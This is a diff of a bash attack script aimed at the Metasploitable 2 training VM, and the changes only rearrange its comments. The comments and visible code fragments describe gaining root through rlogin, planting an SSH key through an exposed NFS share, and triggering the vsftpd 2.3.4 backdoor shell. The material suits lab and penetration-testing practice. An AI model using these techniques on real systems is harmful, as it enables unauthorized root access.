@@ -2,15 +2,9 @@
 #
 #It is used to perform various actions on a target machine that is running the Metasploitable 2 vulnerable virtual machine. The script defines three different functions (simpleRLOGIN, mountNFS and vsftpdbackdoor) that can be run separately or in combination depending on the user's choice.
 #
-#simpleRLOGIN function uses the rlogin command to connect to the target machine as the root user.
-#
-#mountNFS function attempts to mount the target machine's NFS share to the /tmp/r00t directory on the attacker machine, adds some ssh config, creates an ssh key, copies the public key to the authorized_keys file on the target machine and then uses ssh to connect to the target machine with the newly created key
-#
-#vsftpdbackdoor function uses Telnet to exploit a backdoor in version 2.3.4 of vsftpd. The backdoored version will open a new listening shell on port 6200 with root privilege. effectively an RCE.
-#
 #!/bin/bash
 # ################################################
-# part 1
+#simpleRLOGIN function uses the rlogin command to connect to the target machine as the root user.
 # ################################################
 simpleRLOGIN (){
 printf "
@@ -21,7 +15,7 @@ sudo apt install rsh-client -y
 rlogin -l root ${ipt}
 }
 # ################################################
-# part 2
+#mountNFS function attempts to mount the target machine's NFS share to the /tmp/r00t directory on the attacker machine, adds some ssh config, creates an ssh key, copies the public key to the authorized_keys file on the target machine and then uses ssh to connect to the target machine with the newly created key
 # ################################################
 mountNFS (){
 printf " 
@@ -44,7 +38,7 @@ rmdir ${dir_path}
 ssh -i ${sshif} root@${ipt} -y
 }
 # ################################################
-# part 3
+# #vsftpdbackdoor function uses Telnet to exploit a backdoor in version 2.3.4 of vsftpd. The backdoored version will open a new listening shell on port 6200 with root privilege. effectively an RCE.
 # ################################################
 vsftpdbackdoor (){
 ( 
